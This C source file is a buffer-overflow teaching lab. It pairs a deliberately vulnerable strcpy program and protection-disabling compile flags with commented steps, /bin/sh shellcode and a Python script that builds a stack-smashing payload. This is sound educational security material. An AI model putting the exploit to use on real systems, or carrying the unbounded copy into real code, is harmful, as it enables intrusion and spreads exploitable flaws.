/*
 * @file basic-buffer-overflow.c
 * @description A simple C example of a vulnerable program and a basic exploit concept.
 *              This is for educational purposes ONLY. Do not use on systems without explicit authorization.
 *
 * Compile with (for easier exploitation in labs, disabling protections):
 *   gcc -fno-stack-protector -z execstack -no-pie -o vulnerable_program basic-buffer-overflow.c
 *   (On some systems, -no-pie might be needed to disable Position Independent Executables)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// --- Vulnerable Program ---
void vulnerable_function(char *input)
{
    char buffer[64]; // A buffer of 64 bytes
    printf("\n[Vulnerable Function] Buffer address: %p\n", buffer);
    printf("[Vulnerable Function] Input address:  %p\n", input);

    // This is the vulnerable line: strcpy does not perform bounds checking.
    // If 'input' is longer than 63 bytes (plus null terminator), it will overwrite
    // data beyond the buffer, including the return address on the stack.
    strcpy(buffer, input);

    printf("[Vulnerable Function] Received: %s\n", buffer);
}

int main(int argc, char **argv)
{
    printf("[*] Program started.\n");

    if (argc < 2)
    {
        printf("Usage: %s <input_string>\n", argv[0]);
        exit(0);
    }

    printf("[*] Calling vulnerable_function with input: %s\n", argv[1]);
    vulnerable_function(argv[1]);
    printf("[*] Program finished normally (if not exploited).\n");

    return 0;
}

/*
 * --- Exploit Concept (Manual/Conceptual Steps) ---
 *
 * 1.  **Find the Offset**: Determine how many bytes are needed to overwrite the return address.
 *     - Use a debugger (GDB, Immunity Debugger) to set a breakpoint before `strcpy`.
 *     - Fill the buffer with a known pattern (e.g., `python -c 'print("A"*100)'`).
 *     - Observe the stack and the EIP/RIP register after `strcpy` to find the exact offset.
 *     - Tools like `pattern_create.rb` (Metasploit) and `pattern_offset.rb` can help.
 *
 * 2.  **Craft Shellcode**: Write or find shellcode for the target architecture and OS.
 *     - Shellcode is a small piece of assembly code that performs a specific task (e.g., spawning a shell).
 *     - Example (Linux x86 /bin/sh shellcode, 23 bytes):
 *       `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
 *
 * 3.  **Determine Return Address**: Find a reliable address to jump to.
 *     - Often, this is an address within a NOP sled (a sequence of No-Operation instructions, `\x90` for x86/x64).
 *     - The NOP sled increases the chances of hitting the shellcode if the return address is slightly off.
 *     - The return address could also be a pointer to a library function (e.g., `system()`) if ROP (Return-Oriented Programming) is used.
 *
 * 4.  **Construct Malicious Input (Payload)**:
 *     - `[Padding (e.g., 'A's)] + [NOP Sled] + [Shellcode] + [Return Address]`
 *     - The padding fills the buffer up to the point just before the return address.
 *     - The return address overwrites the saved return pointer on the stack, redirecting execution.
 *
 * --- Example Python Exploit Script (Conceptual) ---
 *
 * import sys
 * import struct
 *
 * # Offset to overwrite EIP/RIP (example value, needs to be found dynamically)
 * OFFSET = 64 + 4 # 64 bytes for buffer + 4 bytes for EBP (on 32-bit)
 *
 * # NOP sled (No Operation instructions) - for reliability
 * NOP_SLED = b"\x90" * 20
 *
 * # Shellcode (example Linux x86 /bin/sh shellcode)
 * SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 *
 * # Return Address (Address of NOP sled or shellcode in memory)
 * # This address needs to be found dynamically during debugging (e.g., `0xbffff000`)
 * # Use `struct.pack("<I", address)` for little-endian 32-bit address
 * # For 64-bit, use `struct.pack("<Q", address)`
 * RETURN_ADDRESS = struct.pack("<I", 0xbffff000 + 100) # Example address, adjust as needed
 *
 * # Construct the malicious input
 * buffer_fill = b"A" * (OFFSET - len(NOP_SLED) - len(SHELLCODE))
 * exploit_string = buffer_fill + NOP_SLED + SHELLCODE + RETURN_ADDRESS
 *
 * sys.stdout.buffer.write(exploit_string)
 *
 * # --- How to run the exploit (conceptual) ---
 * # 1. Compile the vulnerable program:
 * #    gcc -fno-stack-protector -z execstack -no-pie -o vulnerable_program basic-buffer-overflow.c
 * # 2. Run the Python script to generate the payload and feed it to the vulnerable program:
 * #    (python3 exploit.py > payload.txt) && ./vulnerable_program $(cat payload.txt)
 * #    OR
 * #    python3 exploit.py | xargs -0 ./vulnerable_program
 *
 * # Note: Modern systems have many protections (ASLR, DEP/NX, Stack Canaries, PIE) that make
 * #       buffer overflow exploitation significantly harder. This example disables some for learning.
 */
